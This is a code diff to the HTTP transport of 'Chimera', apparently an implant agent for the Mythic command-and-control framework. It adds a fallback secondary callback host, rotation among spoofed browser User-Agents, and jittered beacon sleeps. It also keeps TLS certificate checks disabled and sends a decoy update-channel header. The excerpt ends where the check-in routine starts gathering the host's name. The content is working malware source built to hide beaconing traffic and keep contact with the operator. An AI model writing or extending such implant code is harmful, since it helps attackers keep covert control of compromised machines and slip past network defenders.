@@ -8,22 +8,74 @@ namespace Chimera
     // Mythic wire format when mythic_encrypts = True:
     // Send:    Base64( UUID[36 bytes] + plaintext_json )
     // Receive: Base64( UUID[36 bytes] + plaintext_json ) -- strip first 36 bytes
+    //
+    // Runtime-mutable fields (written by C2Config command):
+    //   SecondaryURL  — fallback callback host; empty = disabled
+    //   UaRotate      — randomly pick from UaPool each request
+    //   JitterBase    — sleep seconds base (overrides Config.SleepInterval)
+    //   JitterRange   — ±range added to JitterBase
     public static class C2Http
     {
-        private static readonly HttpClient Client = CreateClient();
+        // -----------------------------------------------------------------------
+        // Runtime-mutable C2 config — C2Config command writes directly to these.
+        // -----------------------------------------------------------------------
+        public static string SecondaryURL = "";
+        public static bool   UaRotate     = false;
+        public static int    JitterBase   = -1;  // -1 = use Config.SleepInterval
+        public static int    JitterRange  = -1;  // -1 = use Config.Jitter %
 
-        private static HttpClient CreateClient()
+        // Common browser User-Agents for rotation
+        public static readonly string[] UaPool = new string[]
+        {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Brave/1.65"
+        };
+
+        // -----------------------------------------------------------------------
+        // HttpClient — recreated when UA rotation turns on/off.
+        // -----------------------------------------------------------------------
+        private static HttpClient _client = CreateClient(Config.UserAgent);
+        private static readonly Random _rng = new Random();
+        private static readonly object _lock = new object();
+
+        private static HttpClient CreateClient(string ua)
         {
             var handler = new HttpClientHandler();
             handler.ServerCertificateCustomValidationCallback =
                 (msg, cert, chain, errors) => true;
             var client = new HttpClient(handler);
-            client.DefaultRequestHeaders.Add("User-Agent", Config.UserAgent);
+            client.DefaultRequestHeaders.Add("User-Agent", ua);
             client.DefaultRequestHeaders.Add("Accept", "application/json");
             client.DefaultRequestHeaders.Add("X-Update-Channel", "stable");
             return client;
         }
 
+        // -----------------------------------------------------------------------
+        // Sleep helper — respects JitterBase/JitterRange when set by c2config.
+        // -----------------------------------------------------------------------
+        public static void Sleep()
+        {
+            int baseMs;
+            int jitterPct;
+
+            lock (_lock)
+            {
+                baseMs    = (JitterBase  >= 0 ? JitterBase  : Config.SleepInterval) * 1000;
+                jitterPct =  JitterRange >= 0 ? JitterRange : Config.Jitter;
+            }
+
+            int maxDelta = (int)(baseMs * (jitterPct / 100.0));
+            int actual   = baseMs + _rng.Next(-maxDelta, maxDelta + 1);
+            if (actual < 500) actual = 500;
+            System.Threading.Thread.Sleep(actual);
+        }
+
+        // -----------------------------------------------------------------------
+        // Wire helpers
+        // -----------------------------------------------------------------------
         private static string Wrap(string plaintext)
         {
             byte[] uuidBytes = Encoding.UTF8.GetBytes(Config.PayloadUUID);
@@ -41,21 +93,60 @@ namespace Chimera
             return Encoding.UTF8.GetString(combined, 36, combined.Length - 36);
         }
 
+        // -----------------------------------------------------------------------
+        // Core send — tries primary, falls back to secondary if set and primary fails.
+        // -----------------------------------------------------------------------
         public static string Send(string jsonMessage)
+        {
+            string wrapped = Wrap(jsonMessage);
+            var content    = new StringContent(wrapped, Encoding.UTF8, "application/json");
+
+            // Pick UA if rotation enabled
+            HttpClient client;
+            lock (_lock)
+            {
+                if (UaRotate)
+                {
+                    string ua = UaPool[_rng.Next(UaPool.Length)];
+                    client = CreateClient(ua);
+                }
+                else
+                {
+                    client = _client;
+                }
+            }
+
+            // Try primary URL
+            string primary = Config.CallbackURL;
+            string result  = TrySend(client, primary, content);
+            if (result != null) return result;
+
+            // Try secondary URL if set
+            string secondary;
+            lock (_lock) { secondary = SecondaryURL; }
+            if (!string.IsNullOrEmpty(secondary))
+            {
+                var content2 = new StringContent(wrapped, Encoding.UTF8, "application/json");
+                result = TrySend(client, secondary, content2);
+            }
+
+            return result;
+        }
+
+        private static string TrySend(HttpClient client, string url, StringContent content)
         {
             try
             {
-                string wrapped = Wrap(jsonMessage);
-                var content    = new StringContent(wrapped, Encoding.UTF8, "application/json");
-                var response   = Client.PostAsync(Config.CallbackURL, content)
-                                       .GetAwaiter().GetResult();
-                string body    = response.Content.ReadAsStringAsync()
-                                         .GetAwaiter().GetResult();
+                var response = client.PostAsync(url, content).GetAwaiter().GetResult();
+                string body  = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                 return Unwrap(body);
             }
             catch { return null; }
         }
 
+        // -----------------------------------------------------------------------
+        // Public API (unchanged surface for callers)
+        // -----------------------------------------------------------------------
         public static string CheckIn()
         {
             string hostname = Dns.GetHostName();
